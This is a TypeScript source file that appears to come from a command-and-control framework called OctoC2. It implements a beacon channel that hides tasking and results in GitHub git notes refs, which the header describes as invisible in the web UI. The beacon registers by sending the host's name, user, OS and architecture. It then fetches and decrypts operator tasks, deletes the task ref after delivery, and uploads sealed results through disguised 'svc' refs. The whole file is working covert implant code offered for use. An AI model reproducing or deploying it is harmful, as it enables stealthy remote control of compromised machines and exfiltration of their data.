/**
 * OctoC2 — NotesTentacle (Tentacle 11)
 *
 * Covert C2 channel using GitHub git notes refs.
 * Refs are invisible in the GitHub web UI.
 *
 * Ref layout (using first 8 chars of beaconId for compactness):
 *   refs/notes/svc-t-{id8}  Server → Beacon  encrypted Task[] blob
 *   refs/notes/svc-r-{id8}  Beacon → Server  sealed TaskResult blob
 *   refs/notes/svc-a-{id8}  Beacon → Server  ACK / registration blob
 *
 * Task delivery (server side uses NotesChannel):
 *   Blob content: JSON {"nonce":"<b64>","ciphertext":"<b64>"}
 *   Encrypted with crypto_box (operator secret + beacon public)
 *
 * Result submission (beacon side):
 *   Blob content: base64url crypto_box_seal to operator public key
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import {
  decryptBox, sealBox,
  bytesToBase64, base64ToBytes,
} from "../crypto/sodium.ts";
import type { CheckinPayload, Task, TaskResult } from "../types.ts";

const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";

export class NotesTentacle extends BaseTentacle {
  readonly kind = "notes" as const;

  private operatorPublicKey: Uint8Array | null = null;
  private ackSent   = false;
  private lastTaskSha: string | null = null;

  // ── Ref name helpers ─────────────────────────────────────────────────────────

  private get id8(): string { return this.config.id.slice(0, 8); }

  // getRef / updateRef / deleteRef take the ref WITHOUT the "refs/" prefix
  private get taskRef(): string   { return `notes/svc-t-${this.id8}`; }
  private get resultRef(): string { return `notes/svc-r-${this.id8}`; }
  private get ackRef(): string    { return `notes/svc-a-${this.id8}`; }

  // createRef requires the FULL ref with "refs/" prefix
  private get taskRefFull(): string   { return `refs/notes/svc-t-${this.id8}`; }
  private get resultRefFull(): string { return `refs/notes/svc-r-${this.id8}`; }
  private get ackRefFull(): string    { return `refs/notes/svc-a-${this.id8}`; }

  // ── Availability ─────────────────────────────────────────────────────────────

  override async isAvailable(): Promise<boolean> {
    try {
      await this.octokit.rest.repos.get({
        owner: this.config.repo.owner,
        repo:  this.config.repo.name,
      });
      return true;
    } catch {
      return false;
    }
  }

  // ── Operator key resolution ───────────────────────────────────────────────────

  private async getOperatorPublicKey(): Promise<Uint8Array> {
    if (this.operatorPublicKey) return this.operatorPublicKey;
    const resp = await this.octokit.rest.actions.getRepoVariable({
      owner: this.config.repo.owner,
      repo:  this.config.repo.name,
      name:  OPERATOR_PUBKEY_VAR,
    });
    const b64 = resp.data.value?.trim();
    if (!b64) throw new Error("NotesTentacle: MONITORING_PUBKEY variable not set");
    const key = await base64ToBytes(b64);
    if (key.length !== 32) throw new Error("NotesTentacle: operator public key is not 32 bytes");
    this.operatorPublicKey = key;
    return key;
  }

  // ── Ref upsert helper ────────────────────────────────────────────────────────

  private async upsertRef(
    refShort: string,
    refFull:  string,
    sha:      string,
  ): Promise<void> {
    const { owner, name: repo } = this.config.repo;
    try {
      await this.octokit.rest.git.updateRef({ owner, repo, ref: refShort, sha, force: true });
    } catch (err: any) {
      if (err?.status === 422 || err?.status === 404) {
        await this.octokit.rest.git.createRef({ owner, repo, ref: refFull, sha });
      } else {
        throw err;
      }
    }
  }

  // ── Checkin ──────────────────────────────────────────────────────────────────

  async checkin(payload: CheckinPayload): Promise<Task[]> {
    const operatorPubKey = await this.getOperatorPublicKey();
    const { owner, name: repo } = this.config.repo;

    // 1. Send ACK on first checkin (registers this beacon with NotesChannel)
    if (!this.ackSent) {
      const ackContent = JSON.stringify({
        beaconId:  this.config.id,
        publicKey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
        hostname:  payload.hostname,
        username:  payload.username,
        os:        payload.os,
        arch:      payload.arch,
        checkinAt: payload.checkinAt,
      });
      const ackBlob = await this.octokit.rest.git.createBlob({
        owner, repo, content: ackContent, encoding: "utf-8",
      });
      await this.upsertRef(this.ackRef, this.ackRefFull, ackBlob.data.sha);
      this.ackSent = true;
    }

    // 2. Poll task ref SHA
    let currentSha: string;
    try {
      const refResp = await this.octokit.rest.git.getRef({
        owner, repo, ref: this.taskRef,
      });
      currentSha = refResp.data.object.sha;
    } catch (err: any) {
      if (err?.status === 404) return [];  // No tasks pending
      throw err;
    }

    // 3. SHA unchanged → no new tasks
    if (currentSha === this.lastTaskSha) return [];
    this.lastTaskSha = currentSha;

    // 4. Fetch blob
    const blobResp = await this.octokit.rest.git.getBlob({
      owner, repo, file_sha: currentSha,
    });
    const rawContent = blobResp.data.encoding === "base64"
      ? atob(blobResp.data.content.replace(/\n/g, ""))
      : blobResp.data.content;

    // 5. Decrypt
    let tasks: Task[];
    try {
      const envelope = JSON.parse(rawContent) as { nonce: string; ciphertext: string };
      const plainBytes = await decryptBox(
        envelope.ciphertext,
        envelope.nonce,
        operatorPubKey,
        this.config.beaconKeyPair.secretKey,
      );
      tasks = JSON.parse(new TextDecoder().decode(plainBytes)) as Task[];
    } catch {
      return [];
    }

    // 6. Clear the task ref (prevents re-delivery)
    try {
      await this.octokit.rest.git.deleteRef({ owner, repo, ref: this.taskRef });
    } catch { /* best-effort */ }

    return tasks;
  }

  // ── Submit result ────────────────────────────────────────────────────────────

  async submitResult(result: TaskResult): Promise<void> {
    const operatorPubKey = await this.getOperatorPublicKey();
    const { owner, name: repo } = this.config.repo;

    // Use a per-task result ref so multiple results don't overwrite each other.
    // Format: refs/notes/svc-r-{beacon-id8}-{task-id8}
    // The server's processResultRefs() lists all refs matching "notes/svc-r-"
    // so it will pick up both this format and legacy single-beacon refs.
    const taskId8 = result.taskId.replace(/-/g, "").slice(0, 8);
    const resultRef     = `notes/svc-r-${this.id8}-${taskId8}`;
    const resultRefFull = `refs/notes/svc-r-${this.id8}-${taskId8}`;

    const sealed = await sealBox(JSON.stringify(result), operatorPubKey);
    const blob = await this.octokit.rest.git.createBlob({
      owner, repo, content: sealed, encoding: "utf-8",
    });
    await this.upsertRef(resultRef, resultRefFull, blob.data.sha);
  }

  override async teardown(): Promise<void> {}
}
